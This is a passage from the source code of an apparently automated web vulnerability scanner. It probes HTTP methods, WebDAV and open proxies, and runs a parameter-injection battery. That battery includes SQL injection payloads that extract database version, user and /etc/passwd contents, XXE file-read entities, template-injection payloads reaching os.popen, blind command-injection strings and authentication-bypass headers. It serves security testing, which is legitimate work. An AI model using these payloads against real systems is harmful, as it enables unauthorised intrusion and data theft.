            gst, gbody, _ = await _grab(s, url, method="GET", timeout=8,
                                        limit=4000)
            if gst != 200 or blob not in gbody:
                return                    # 2xx without persistence -> no FP
            dst, _, _ = await _grab(s, url, method="DELETE", timeout=8,
                                    limit=2000)
            dget, dbody, _ = await _grab(s, url, method="GET", timeout=8,
                                         limit=4000)
            removed = dst in (200, 202, 204) and (dget != 200
                                                  or blob not in dbody)
            note = "" if removed else " (cleanup DELETE failed - remove the canary manually)"
            findings.append(
                f"[PUT-ALLOWED] {url} accepted an unauthenticated PUT ({st}) "
                f"and persisted it (GET returned the canary){note}")
            rows += 1
            if removed:
                findings.append(
                    f"[DELETE-ALLOWED] {url} removed the just-written canary "
                    f"via unauthenticated DELETE ({dst} -> GET {dget})")
                rows += 1
        await asyncio.gather(*[one(h) for h in targets])
    print(f"  [putdel] -> {rows} hits", flush=True)
    return rows


# ---------------- wave 24: expanded HTTP-method battery ----------------
async def dav_method_checks(conn, probes, findings, cap_hosts=20):
    """TRACK/DEBUG echo, WebDAV SEARCH/MKCOL/MOVE, CONNECT tunnel.
    Each positive requires a deny/control negative to avoid FPs."""
    rows = 0
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    if not targets:
        print("  [davx] skipped: no live hosts", flush=True)
        return rows
    async with xsession(conn) as s:
        async def one(h):
            nonlocal rows
            base = _burl(probes, h)
            tok = os.urandom(6).hex()
            marker = f"X-Sxe-Meth-{tok}"
            # --- TRACK echo (GET control first) ---
            gst, gbody, _ = await _grab(s, f"{base}/", method="GET",
                                        headers={marker: tok},
                                        timeout=6, limit=4000)
            echoes = gst == 200 and (tok.encode() in gbody
                                     or marker.encode() in gbody)
            if not echoes:
                st, body, _ = await _grab(s, f"{base}/", method="TRACK",
                                          headers={marker: tok},
                                          timeout=6, limit=4000)
                if st == 200 and (tok.encode() in body
                                  or marker.encode() in body):
                    findings.append(f"[TRACK] {h} TRACK echoes request "
                                    f"headers (XST via TRACK)")
                    rows += 1
            # --- DEBUG echo ---
            if not echoes:
                st, body, _ = await _grab(s, f"{base}/", method="DEBUG",
                                          headers={marker: tok},
                                          timeout=6, limit=4000)
                if st == 200 and (tok.encode() in body
                                  or marker.encode() in body):
                    findings.append(f"[DEBUG-METHOD] {h} DEBUG echoes "
                                    f"request (IIS/ASP debug dump)")
                    rows += 1
            # --- SEARCH (DASL) ---
            st, body, _ = await _grab(
                s, f"{base}/", method="SEARCH",
                headers={"Content-Type": "text/xml"},
                data=b'<?xml version="1.0"?>'
                     b'<a:searchrequest xmlns:a="DAV:">'
                     b'<a:sql>SELECT * FROM SCOPE()</a:sql>'
                     b'</a:searchrequest>',
                timeout=8, limit=4000)
            if st in (200, 207) and (b"multistatus" in body.lower()
                                     or b"<d:response" in body.lower()
                                     or b"searchrequest" in body.lower()):
                findings.append(f"[SEARCH-ALLOWED] {h} WebDAV SEARCH "
                                f"answered {st} (content enumeration)")
                rows += 1
            # --- MKCOL canary -> verify -> cleanup ---
            col = f"/sxe-dav-{tok}"
            mst, _, _ = await _grab(s, f"{base}{col}", method="MKCOL",
                                    timeout=8, limit=2000)
            if mst in (200, 201):
                vst, vbody, _ = await _grab(
                    s, f"{base}{col}", method="PROPFIND",
                    headers={"Depth": "0",
                             "Content-Type": "application/xml"},
                    data=b'<?xml version="1.0"?>'
                         b'<a:propfind xmlns:a="DAV:"><a:allprop/></a:propfind>',
                    timeout=8, limit=4000)
                exists = vst in (200, 207) and (
                    b"multistatus" in vbody.lower()
                    or b"<d:response" in vbody.lower())
                if exists:
                    findings.append(
                        f"[MKCOL-ALLOWED] {base}{col} created via "
                        f"unauthenticated MKCOL ({mst}, verified via "
                        f"PROPFIND {vst})")
                    rows += 1
                    # --- MOVE the collection ---
                    new = f"/sxe-dav-{tok}-m"
                    xst, _, _ = await _grab(
                        s, f"{base}{col}", method="MOVE",
                        headers={"Destination": f"{base}{new}"},
                        timeout=8, limit=2000)
                    if xst in (200, 201, 204):
                        nst, nbody, _ = await _grab(
                            s, f"{base}{new}", method="PROPFIND",
                            headers={"Depth": "0",
                                     "Content-Type": "application/xml"},
                            data=b'<?xml version="1.0"?>'
                                 b'<a:propfind xmlns:a="DAV:">'
                                 b'<a:allprop/></a:propfind>',
                            timeout=8, limit=4000)
                        ost, _, _ = await _grab(
                            s, f"{base}{col}", method="PROPFIND",
                            headers={"Depth": "0",
                                     "Content-Type": "application/xml"},
                            data=b'<?xml version="1.0"?>'
                                 b'<a:propfind xmlns:a="DAV:">'
                                 b'<a:allprop/></a:propfind>',
                            timeout=8, limit=2000)
                        moved = nst in (200, 207) and ost in (404, 410)
                        if moved:
                            findings.append(
                                f"[MOVE-ALLOWED] {base}{col} moved to "
                                f"{new} unauthenticated ({xst}, old "
                                f"PROPFIND {ost}, new {nst})")
                            rows += 1
                        await _grab(s, f"{base}{new}", method="DELETE",
                                    timeout=8, limit=1000)
                    else:
                        await _grab(s, f"{base}{col}", method="DELETE",
                                    timeout=8, limit=1000)
                else:
                    await _grab(s, f"{base}{col}", method="DELETE",
                                timeout=8, limit=1000)
            # --- CONNECT tunnel (raw socket; aiohttp CONNECT is unsafe) ---
            sch = probes[h].get("scheme") or "https"
            if ":" in h:
                host_only, pstr = h.rsplit(":", 1)
                try:
                    port = int(pstr)
                except ValueError:
                    port = 443 if sch == "https" else 80
            else:
                host_only = h
                port = 443 if sch == "https" else 80
            try:
                if sch == "https":
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    r, w = await asyncio.wait_for(
                        asyncio.open_connection(host_only, port, ssl=ctx),
                        timeout=6)
                else:
                    r, w = await asyncio.wait_for(
                        asyncio.open_connection(host_only, port),
                        timeout=6)
                w.write(f"CONNECT {host_only}:{port} HTTP/1.1\r\n"
                        f"Host: {host_only}:{port}\r\n\r\n".encode())
                await w.drain()
                line = await asyncio.wait_for(r.readline(), timeout=6)
                w.close()
                try:
                    await w.wait_closed()
                except Exception:
                    pass
                m = re.match(rb"HTTP/1\.[01] (\d{3})", line)
                if m and 200 <= int(m.group(1)) < 300:
                    findings.append(
                        f"[CONNECT-PROXY] {h} accepted CONNECT "
                        f"({int(m.group(1))}) - open tunnel/proxy")
                    rows += 1
            except Exception:
                pass
        await asyncio.gather(*[one(h) for h in targets])
    print(f"  [davx] -> {rows} hits", flush=True)
    return rows


# ---------------- phase 15: surface + CVE/EOL/CDN ----------------
def _vt(v):
    n = [int(x) for x in re.findall(r"\d+", v or "")][:4]
    while len(n) < 4:
        n.append(0)
    return tuple(n)


def _in_range(v, lo, hi):
    t = _vt(v)
    if lo and t < _vt(lo):
        return False
    if hi and t > _vt(hi):
        return False
    return True


def detect_cdn(probes):
    cdn = {}
    rules = [("Cloudflare", ("cf-ray", "cf-cache-status", "cloudflare")),
             ("CloudFront", ("x-amz-cf-", "x-cache", "cloudfront")),
             ("Fastly", ("fastly", "x-served-by")),
             ("Akamai", ("akamaighost", "akamai", "x-akamai")),
             ("Sucuri", ("x-sucuri", "sucuri")),
             ("Imperva", ("x-iinfo", "incapsula")),
             ("Varnish", ("x-varnish",)),
             ("Azure", ("x-azure", "x-msedge")),
             ("AWS ALB", ("x-amzn-trace-id",)),
             ("Google Cloud LB", ("via",))]
    for h, i in sorted(probes.items()):
        hdr = {k.lower(): v.lower() for k, v in (i.get("headers") or {}).items()}
        blob = " ".join(f"{k} {v}" for k, v in hdr.items())
        hits = []
        for name, keys in rules:
            if any(k in blob for k in keys):
                if name == "Google Cloud LB" and not hdr.get("via", "").startswith("1.1 google"):
                    continue
                if name == "AWS ALB" and "google" in blob:
                    continue
                hits.append(name)
        if hits:
            cdn[h] = sorted(set(hits))
    return cdn


def host_corpus(h, probes, port_by_host):
    parts = []
    hdr = probes.get(h, {}).get("headers") or {}
    for k in ("server", "x-powered-by", "via", "x-aspnet-version", "x-runtime"):
        v = hdr.get(k, "")
        if v:
            parts.append(v)
    for b in port_by_host.get(h, ()):
        if b:
            parts.append(b)
    return " || ".join(parts)


# ---------------- phase 16: parameter attacks (DAST-lite) ----------------
URL_KEYS = {"url", "uri", "src", "source", "dest", "destination", "feed", "host",
            "endpoint", "callback", "cb", "webhook", "image", "img", "link",
            "target", "redirect", "redirect_uri", "redir", "next", "return",
            "return_to", "goto", "continue", "back", "out", "u", "r", "jump",
            "proxy", "fetch", "api", "site",
            "return_url", "returnurl", "redirect_url", "redirecturl",
            "success_url", "cancel_url", "fail_url", "reply", "deeplink"}
FILE_KEYS = {"file", "filename", "path", "filepath", "dir", "directory", "page",
             "template", "include", "inc", "doc", "document", "folder", "view",
             "download", "load", "read", "show", "name", "f"}
SQL_ERR = (rb"sql syntax.*mysql", rb"warning.*mysqli", rb"pg_query\(\)",
           rb"unterminated quoted string", rb"sqlite3?\.(operational|logic|syntax)error",
           rb"ora-\d{4,5}", rb"odbc sql server driver", rb"sqlstate\[[0-9a-z]+\]",
           rb"you have an error in your sql", rb"syntax error at or near",
           rb"microsoft jet database", rb"java\.sql\.sqlexception", rb"mysql_fetch")
SQL_DB_HINTS = (
    (rb"mysql|mysqli|you have an error in your sql", "MySQL"),
    (rb"pg_query|pg_exec|psycopg|postgresql|unterminated quoted string|"
     rb"syntax error at or near", "PostgreSQL"),
    (rb"odbc|sql server|nvarchar|incorrect syntax near|conversion failed when", "MSSQL"),
    (rb"ora-\d{4,5}", "Oracle"),
    (rb"sqlite", "SQLite"),
    (rb"jet database|microsoft access", "Access"),
    (rb"java\.sql|jdbc", "Java/JDBC"),
)
SQL_BOOL_PAIRS = (
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1') AND ('1'='1", "1') AND ('1'='2"),
    ("1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND 1=1#", "1' AND 1=2#"),
    ("1 AND 1=1#", "1 AND 1=2#"),
)
SQL_TIME_PAYLOADS = (
    "1' AND SLEEP(5)-- ",
    "1';SELECT pg_sleep(5)-- ",
    "1';WAITFOR DELAY '0:0:5'-- ",
    "1' AND BENCHMARK(6000000,SHA1(1))-- ",
    "1 AND IF(1=1,SLEEP(5),0)#",
    "1' AND IF(1=1,SLEEP(5),0)#",
)
SQL_EXTRACT = (
    ("MySQL", "version", "1' AND extractvalue(1,concat(0x7e,version()))-- ",
     rb"'~([^']{3,60})'"),
    ("MySQL", "database", "1' AND extractvalue(1,concat(0x7e,database()))-- ",
     rb"'~([^']{3,60})'"),
    ("MySQL", "user", "1' AND extractvalue(1,concat(0x7e,user()))-- ",
     rb"'~([^']{3,60})'"),
    ("MySQL", "version", "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT("
     "(SELECT version()),0x7c,FLOOR(RAND(0)*2))x FROM information_schema.tables "
     "GROUP BY x)y)-- ", rb"Duplicate entry '([^'|]{1,70})"),
    ("MySQL", "database", "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT("
     "(SELECT database()),0x7c,FLOOR(RAND(0)*2))x FROM information_schema.tables "
     "GROUP BY x)y)-- ", rb"Duplicate entry '([^'|]{1,70})"),
    ("MySQL", "user", "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT("
     "(SELECT user()),0x7c,FLOOR(RAND(0)*2))x FROM information_schema.tables "
     "GROUP BY x)y)-- ", rb"Duplicate entry '([^'|]{1,70})"),
    ("MySQL", "version", "1\" AND extractvalue(1,concat(0x7e,version()))-- ",
     rb"'~([^']{3,60})'"),
    ("PostgreSQL", "version", "1' AND 1=CAST(version() AS int)-- ",
     rb'invalid input syntax for type integer: "([^"]{3,60})"'),
    ("PostgreSQL", "database", "1' AND 1=CAST(current_database() AS int)-- ",
     rb'invalid input syntax for type integer: "([^"]{3,60})"'),
    ("PostgreSQL", "user", "1' AND 1=CAST(current_user AS int)-- ",
     rb'invalid input syntax for type integer: "([^"]{3,60})"'),
    ("MSSQL", "version", "1';SELECT CAST(@@version AS int)-- ",
     rb"conversion failed when converting the [a-z]+ value '([^']{3,70})'"),
    ("MSSQL", "database", "1';SELECT CAST(DB_NAME() AS int)-- ",
     rb"conversion failed when converting the [a-z]+ value '([^']{3,70})'"),
    ("MSSQL", "user", "1';SELECT CAST(SUSER_SNAME() AS int)-- ",
     rb"conversion failed when converting the [a-z]+ value '([^']{3,70})'"),
)
SQL_FILE_READ = (
    ("MySQL", "1' AND extractvalue(1,concat(0x7e,LOAD_FILE('/etc/passwd')))-- ",
     rb"'~(root:[^']{3,90})'"),
    ("MySQL", "1' AND extractvalue(1,concat(0x7e,LOAD_FILE('C:/Windows/win.ini')))-- ",
     rb"'~(\[(fonts|extensions|mci extensions)\][^']{3,90})'"),
    ("PostgreSQL", "1' AND 1=CAST(pg_read_file('/etc/passwd') AS int)-- ",
     rb'invalid input syntax for type integer: "(root:[^"]{3,140})"'),
    ("PostgreSQL", "1' AND 1=CAST(pg_read_file('C:/Windows/win.ini') AS int)-- ",
     rb'invalid input syntax for type integer: "(\[(fonts|extensions)\][^"]{3,140})"'),
)
CMDI_TIME = ("&ping -n 6 127.0.0.1", ";ping -c 6 127.0.0.1")
EXEC_KEYS = {"cmd", "command", "exec", "execute", "ping", "ip", "host",
             "hostname", "shell", "system", "run", "process", "proc",
             "curl", "wget", "whoami", "nslookup", "dig", "payload"}
CGI_RX = re.compile(r"(?:^|/)(?:cgi-bin/[\w.\-]*|nph-[\w.\-]+|"
                    r"[\w.\-]+\.(?:cgi|sh|pl))(?:$|/)", re.I)
XPATH_ERR = (rb"warning: simplexml", rb"domdocument::", rb"xmldocument",
             rb"xpathexception", rb"error (parsing|in) xpath",
             rb"invalid (predicate|xpath)", rb"xmlpatheval",
             rb"xml parse error", rb"failed to parse (xpath|query)")
XPATH_KEYS = {"xpath", "xq", "xpathq", "xpathquery", "xmlquery",
              "expression", "expr", "filter", "query", "search", "q"}
LDAPI_ERR = (rb"bad search filter", rb"ldapexception", rb"ldap error",
             rb"invalid (dn|filter) syntax", rb"unclosed quotation mark",
             rb"0x51 \(bad search filter\)", rb"namingcontext",
             rb"directory (operation|service) error")
LDAP_KEYS = {"user", "username", "uid", "cn", "mail", "login", "account",
             "filter", "ldap", "dn", "samaccountname", "samaccount"}
AUTH_PATHS = ("/admin", "/administrator", "/wp-admin/", "/manager",
              "/console", "/phpmyadmin/")
AUTH_BYPASS_HDRS = (
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;by=127.0.0.1"},
)
CALLBACK_KEYS = {"callback", "cb", "jsonp", "func", "function", "handler",
                 "call", "cbk"}
PROTO_KEYS = {"id", "user", "uid", "data", "json", "config", "options",
              "option", "settings", "setting", "obj", "object", "meta",
              "params", "attributes", "props", "properties", "state",
              "view", "model", "item", "row", "record", "node", "entity",
              "input", "template"}
AUTH_MARKERS = (b"admin", b"dashboard", b"sign in", b"password", b"login")
XML_HINT_RX = re.compile(r"soap|wsdl|xml|rpc|api|rest|graphql|service|import|"
                         r"upload|feed", re.I)
XXE_INTERNAL = ('<?xml version="1.0"?><!DOCTYPE d [<!ENTITY i "sxeXXE9f3a">]>'
                '<d><name>&i;</name></d>')
XXE_PASSWD = ('<?xml version="1.0"?><!DOCTYPE d '
              '[<!ENTITY f SYSTEM "file:///etc/passwd">]><d><name>&f;</name></d>')
XXE_WININI = ('<?xml version="1.0"?><!DOCTYPE d '
              '[<!ENTITY f SYSTEM "file:///C:/Windows/win.ini">]>'
              '<d><name>&f;</name></d>')
SSTI_RCE = (
    "{{lipsum.__globals__['os'].popen('echo sxRCEm').read()}}",
    "{{cycler.__init__.__globals__.os.popen('echo sxRCEm').read()}}",
    "{{joiner.__init__.__globals__.os.popen('echo sxRCEm').read()}}",
    "<%= `echo sxRCEm` %>",
    "<% Runtime.getRuntime().exec(\"echo sxRCEm\") %>",
)
SSRF_ERR = (rb"connection refused", rb"failed to connect", rb"couldn't connect",
            rb"can't connect to", rb"getaddrinfo (failed|nodename)",
            rb"no route to host", rb"curl error", rb"could not resolve host",
            rb"error.*fetch.*http", rb"connection reset by peer")
REDIR_CTX = (rb"location\.href\s*=", rb"location\.(?:replace|assign)\s*\(",
             rb"window\.location\s*=", rb"http-equiv=[\"']?refresh",
             rb"window\.open\s*\(")
XSS_CANARY = b"<sxe7xq9z>"
# D3: each engine probe ships a second evaluation with DIFFERENT operands -
# the finding requires BOTH results, so a page that coincidentally contains
# one number can't fake template evaluation
SSTI_PROBE = ("{{7*9281}} {{7*9282}} ${6547*10} ${6547*11} "
              "<%= 5291*10 %> <%= 5291*11 %>")
SSTI_PROBES = ((b"{{7*9281}}", b"64967", b"{{7*9282}}", b"64974",
                "Jinja2/Twig/Freemarker"),
               (b"${6547*10}", b"65470", b"${6547*11}", b"72017",
                "Velocity/SpEL/Mako"),
               (b"<%= 5291*10 %>", b"52910", b"<%= 5291*11 %>", b"58201",
                "ERB/ASP/JSP"))
REDIR_CANARY = "canary-sxe9x7.invalid"
SKIP_PARAMS = {"gclid", "fbclid", "msclkid", "igshid", "yclid", "_ga",
               "mc_cid", "mc_eid", "srsltid"}


def _redir_to_canary(loc):
    """True only when a Location/JS URL really points the browser at the canary
    host (external open redirect) - same-host self-redirects and canary values
    reflected inside query params do not count."""
    v = (loc or "").strip().lower()
    v = v.replace("\\/", "/").replace("\\", "/")   # browsers treat \/ and /\ as //
    v = re.sub(r"^\d+\s*;\s*url\s*=\s*", "", v)       # meta refresh content
    if REDIR_CANARY not in v:
        return False
    if v.startswith("//"):
        host = v[2:].split("/")[0].split("@")[-1].split(":")[0]
    else:
        try:
            host = urlsplit(v).hostname or ""
        except Exception:
            return False
    return bool(host) and (host == REDIR_CANARY
                           or host.endswith("." + REDIR_CANARY))


def _body_redir_hit(body):
    """in-page JS/meta redirect whose parsed target really is the canary host."""
    can = REDIR_CANARY.encode()
    if not body or can not in body:
        return False
    ctx = rb"(?i)(?:" + b"|".join(REDIR_CTX) + rb")"
    for m in re.finditer(ctx, body):
        window = body[m.end(): m.end() + 500]
        start = 0
        while True:
            i = window.find(can, start)
            if i < 0:
                break
            start = i + len(can)
            q0 = max(window.rfind(b"\"", 0, i), window.rfind(b"'", 0, i))
            ends = [x for x in (window.find(b"\"", i), window.find(b"'", i))
                    if x >= 0]
            if q0 < 0 or not ends:
                continue
            cand = window[q0 + 1: min(ends)]
            if _redir_to_canary(cand.decode("utf-8", "ignore")):
                return True
    return False


def _sql_db(body):
    """which database family a SQL error message belongs to ('' = unknown)."""
    for pat, name in SQL_DB_HINTS:
        if re.search(pat, body, re.I):
            return name
    return ""


def _xss_context(body, canary=XSS_CANARY):
    """rough html context the reflected canary sits in: script/attribute/tag/text."""
    i = body.find(canary)
    if i < 0:
        return ""
    pre = body[:i].lower()
    ls = pre.rfind(b"<script")
    if ls != -1 and b"</script>" not in pre[ls:]:
        return "script"
    lt, gt = pre.rfind(b"<"), pre.rfind(b">")
    if lt > gt:
        seg = pre[lt + 1:]
        if seg.count(b'"') % 2 == 1 or seg.count(b"'") % 2 == 1:
            return "attribute"
        return "tag"
    return "text"


def _xss_breakout(body, marker=b"svqx9a7z"):
    """True when the event-handler marker landed INSIDE a tag (even quote count
       since the last '<') - quotes were not escaped, markup injection works."""
    start = 0
    while True:
        i = body.find(marker, start)
        if i < 0:
            return False
        start = i + 1
        lt, gt = body.rfind(b"<", 0, i), body.rfind(b">", 0, i)
        if lt >= 0 and lt > gt:
            seg = body[lt + 1:i]
            if seg.count(b'"') % 2 == 0 and seg.count(b"'") % 2 == 0:
                return True


TRACE_RX = (
    (rb"Traceback \(most recent call last\):", rb"File \"[^\"]+\", line \d+", "python"),
    (rb"\bat [\w$.]+\([\w$.]+\.java:\d+\)", rb"Exception", "java"),
    (rb"System\.[\w.]*Exception", rb"\.cs:\d+", "dotnet"),
    (rb"(?:Fatal error|Uncaught [\w\\\\]+):", rb"on line \d+", "php"),
    (rb"from /[\w./\-]+\.rb:\d+", rb"Error", "ruby"),
    (rb"(?:^|\n)Error[: ].{0,200}?\n\s+at .+?[/\\][\w.\-]+\.(?:js|ts):\d+:\d+",
     rb"[/\\][\w.\-]+\.(?:js|ts):\d+:\d+", "node"),
)


def trace_hit(body):
    """two-part verbose stack-trace match (framework header + file/line path)
       -> engine name or None. callers gate on status >= 400 to keep docs/error
       text on 200 pages from firing."""
    if not body or len(body) > 400_000:
        return None
    for pat, extra, eng in TRACE_RX:
        if re.search(pat, body) and re.search(extra, body):
            return eng
    return None


def _interleave_hosts(targets):
    """spread the request budget across hosts: plain sort lets one noisy
       host eat the whole cap before the next host gets a single request -
       round-robin gives every host an early slot (deterministic: hosts in
       first-seen order, each host's own order preserved)."""
    buckets, order = {}, []
    for t in targets:
        if t[0] not in buckets:
            buckets[t[0]] = []
            order.append(t[0])
        buckets[t[0]].append(t)
    rr, step = [], 0
    while step < max((len(b) for b in buckets.values()), default=0):
        for h in order:
            if step < len(buckets[h]):
                rr.append(buckets[h][step])
        step += 1
    return rr


async def _gett_timed(s, url, secs, cap, sent, extra=None):
    """timed GET for blind stages: (status, hdr, body, elapsed) or None
       (timeout / error - both count as 'no answer' for timing probes)."""
    if cap[0] <= 0:
        return None
    cap[0] -= 1
    sent[0] += 1
    t0 = time.time()
    async with HTTP_SEM:
        try:
            async with s.get(url, headers={**UA, **(extra or {})},
                             timeout=aiohttp.ClientTimeout(total=secs),
                             allow_redirects=False, ssl=False) as r:
                body = await r.content.read(300_000)
                return (r.status, {k.lower(): v for k, v in r.headers.items()},
                        body, time.time() - t0)
        except Exception:
            return None


async def header_cmdi(s, roots, findings, cap, sent):
    """header-channel blind command injection: User-Agent / Referer values
    reach CGI scripts and log-processor pipelines. D2 discipline: a >2s
    delay must appear twice with a fast control between them."""
    for rh in roots:
        if cap[0] < 14:
            break
        c0 = await _gett_timed(s, rh + "/", 6, cap, sent)
        if not (c0 and c0[0] < 500 and c0[3] < 1.5):
            continue
        for hn, pay in (("User-Agent", ";sleep 3 #"),
                        ("User-Agent", "|sleep 3"),
                        ("Referer", ";sleep 3 #")):
            if cap[0] < 10:
                break
            hdr = {hn: f"sxprobe({pay})"}
            t1 = await _gett_timed(s, rh + "/", 7, cap, sent, hdr)
            if t1 is None or t1[3] < 2.0:
                continue
            rec = await _gett_timed(s, rh + "/", 6, cap, sent)
            if not (rec and rec[0] < 500 and rec[3] < 1.5):
                break
            t2 = await _gett_timed(s, rh + "/", 7, cap, sent, hdr)
            if t2 is not None and t2[3] >= 2.0:
                findings.append(
                    f"[CMDI-HEADER] {rh} {hn} delays response >2s twice "
                    f"with `{pay}` (fast controls clean) - blind command "
                    f"injection via request header")
                break


async def param_attacks(probes, attrib, findings, budget=600, sqli=True,
                        cmdi=True, xxe=True, authz=True):
    """read-only DAST-lite GETs (plus POST XML/JSON for XXE & GraphQL batching):
    open redirect (+ //, /\\, \\/ bypass payloads) / reflected XSS (context +
    double/single-quote breakout proof) / SSTI (engine fingerprint, RCE exploit,
    User-Agent + Cookie + Referer header channels) / SQLi (error, boolean-blind,
    time-blind +
    error-based version+db+user extraction via extractvalue & FLOOR(RAND))
    / NoSQLi / XPath / LDAP injection / OS command injection / SSI
    / shellshock / method override / secret query keys / CRLF header
    injection / JSONP callback / prototype pollution / XXE file read /
    host header injection / auth-bypass header tricks / SSRF /
    path traversal (incl. WEB-INF/web.xml) / verbose stack-trace
    disclosure via malformed input."""
    if not probes:
        return 0
    cap = [max(0, int(budget))]
    sent = [0]

    # secrets transmitted in query strings (pure, from harvested attrib).
    # value gate: a key NAME alone is not a leak - the value must exist and
    # look like a credential (?token, ?api_key=YOUR_KEY are not findings)
    for _path, _hs in attrib.items():
        _q = _path.partition("?")[2]
        if not _q:
            continue
        for _kv in _q.split("&"):
            _k, _eq, _v = _kv.partition("=")
            if _k and _eq and is_secret_key(_k) and is_cred_value(_v):
                for _h in _hs:
                    findings.append(
                        f"[PARAM-SECRET] {_h}{_path} carries `{_k.lower()}` "
                        f"in the query string - secrets leak via logs, "
                        f"Referer and browser history")
                break

    async def get(s, url, extra=None):
        if cap[0] <= 0:
            return None
        cap[0] -= 1
        sent[0] += 1
        async with HTTP_SEM:
            try:
                async with s.get(url, headers={**UA, **(extra or {})},
                                 timeout=aiohttp.ClientTimeout(total=12),
                                 allow_redirects=False, ssl=False) as r:
                    return (r.status, {k.lower(): v for k, v in r.headers.items()},
                            await r.content.read(300_000))
            except Exception:
                return None

    async def postx(s, url, data, ctype="application/xml"):
        """POST with a raw body (XML for XXE, JSON for GraphQL batching)."""
        if cap[0] <= 0:
            return None
        cap[0] -= 1
        sent[0] += 1
        async with HTTP_SEM:
            try:
                async with s.post(url, data=data.encode(),
                                  headers={**UA, "Content-Type": ctype},
                                  timeout=aiohttp.ClientTimeout(total=12),
                                  allow_redirects=False, ssl=False) as r:
                    return (r.status, {k.lower(): v for k, v in r.headers.items()},
                            await r.content.read(300_000))
            except Exception:
                return None

    async def gett(s, url, secs, extra=None):
        """timed GET for blind stages: (status, hdr, body, elapsed) or None
           (timeout / error - both count as 'no answer' for timing probes)."""
        return await _gett_timed(s, url, secs, cap, sent, extra)

    targets, seen, per = [], set(), Counter()
    synth, synth_per = [], Counter()
    SYNTH_KEYS = ("url", "next", "redirect", "dest", "callback", "return_url")
    for path, hs in attrib.items():
        if "?" not in path:
            # synthesised redirect-style params: crawled/archived attrib is
            # full of clean paths whose handler still accepts ?url=/?next= -
            # a link without a query string is not proof the endpoint
            # rejects one. capped 4 paths/host, appended AFTER real query
            # targets so they only spend leftover budget
            p = path.split("#", 1)[0]
            if not p.startswith("/"):
                p = "/" + p
            if p != "/":
                for h in sorted(hs):
                    i = probes.get(h)
                    if (not i or not i.get("status") or per[h] >= 25
                            or synth_per[h] >= 4
                            or (h, p, "synth") in seen):
                        continue
                    seen.add((h, p, "synth"))
                    synth_per[h] += 1
                    synth.append((h, i.get("scheme") or "https", p,
                                  list(SYNTH_KEYS[:3])))
            continue
        p, _, q = path.partition("?")
        keys = [k for k in (kv.split("=")[0] for kv in q.split("&")) if k.strip()
                and k.lower() not in SKIP_PARAMS
                and not k.lower().startswith("utm_")]
        # attack-relevant keys first (redirect/file/sensitive names), then
        # the rest - the old flat [:8] cap silently dropped ?url/?next/?file
        # whenever a page carried more than 8 tracking params
        keys.sort(key=lambda k: 0 if k.lower() in (URL_KEYS | FILE_KEYS
                                                   | SENS_PARAMS) else 1)
        keys = keys[:20]
        if not keys:
            continue
        for h in sorted(hs):
            i = probes.get(h)
            if not i or not i.get("status"):
                continue
            k = (h, p, tuple(keys))
            if k in seen or per[h] >= 25:
                continue
            seen.add(k)
            per[h] += 1
            targets.append((h, i.get("scheme") or "https", p or "/", keys))
    # hosts with no query endpoints still get the keyless host-level checks
    # (HOST-INJECT / verbose stack trace / shellshock / method override /
    # auth-bypass headers) - an empty keys list makes the per-key battery a
    # no-op, so this is safe on every live host
    covered = {t[0] for t in targets}
    for h in sorted(probes):
        if h in covered:
            continue
        i = probes.get(h)
        if not i or not i.get("status") or per[h] >= 25:
            continue
        per[h] += 1
        targets.append((h, i.get("scheme") or "https", "/", []))
    targets = _interleave_hosts(sorted(targets))
    first_t = {}
    for _t in targets:
        first_t.setdefault(_t[0], _t)
    # synthesised redirect-param targets run last: real query endpoints and
    # first_t (ERRTRACE) keep budget priority
    targets.extend(synth)
    if not targets or cap[0] <= 0:
        print("  [params] no query endpoints to test", flush=True)
        return 0

    conn = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=600)
    authz_done = set()
    shock_done = set()

    async def one_target(t):
        h, sc, p, keys = t
        n = 0
        ssi_try = False
        root = f"{sc}://{h}{p}"

        # host header injection: generated links must not use untrusted hosts
        if cap[0] >= 2:
            hi = await get(s, root, extra={
                "X-Forwarded-Host": REDIR_CANARY,
                "X-Host": REDIR_CANARY,
                "Forwarded": f"host={REDIR_CANARY}"})
            if hi and hi[2]:
                can = REDIR_CANARY.encode()
                if (b"http://" + can in hi[2] or b"https://" + can in hi[2]
                        or b"//" + can in hi[2]):
                    findings.append(
                        f"[HOST-INJECT] {h}{p} builds absolute URLs from "
                        f"X-Forwarded-Host/Forwarded (canary reflected as URL) - "
                        f"password-reset/link poisoning")
                    n += 1

        # verbose stack traces: malformed input must not leak error paths
        # (two-part trace match, only on >=400 responses, once per host -
        # exactly the host's first sorted target, so concurrent execution
        # can't consume the check on the wrong endpoint). two evidence
        # classes: a native error page already carrying the trace (no
        # payload needed) vs. a trace that ONLY appears on malformed input
        # (control page was clean)
        if first_t.get(h) is t and cap[0] >= 4:
            eng, why, tst = None, root, 0
            sep = "&" if "?" in root else "?"      # targets carry p without query
            b0 = await get(s, root)
            native = trace_hit(b0[2]) if b0 and b0[0] >= 400 else None
            if native:
                findings.append(
                    f"[ERRTRACE] {h}{p} verbose {native} stack trace on the "
                    f"native {b0[0]} error page (present without any "
                    f"payload) - server paths leaked")
                n += 1
            else:
                for pay in ("sxe='", "sxe=%7B%7B"):
                    r = await get(s, root + sep + pay)
                    if r and r[0] >= 400:
                        e2 = trace_hit(r[2])
                        if e2:
                            findings.append(
                                f"[ERRTRACE] {h}{p} verbose {e2} stack trace "
                                f"triggered by malformed input {pay!r} "
                                f"({r[0]}) - server paths leaked")
                            n += 1
                            break

        # shellshock: bash executes commands smuggled into environment
        # variables (classic vector: User-Agent in CGI); control request with
        # a plain canary must not reflect it, otherwise UA echo != RCE
        if cmdi and cap[0] >= 6:
            shk = [f"{sc}://{h}/"]
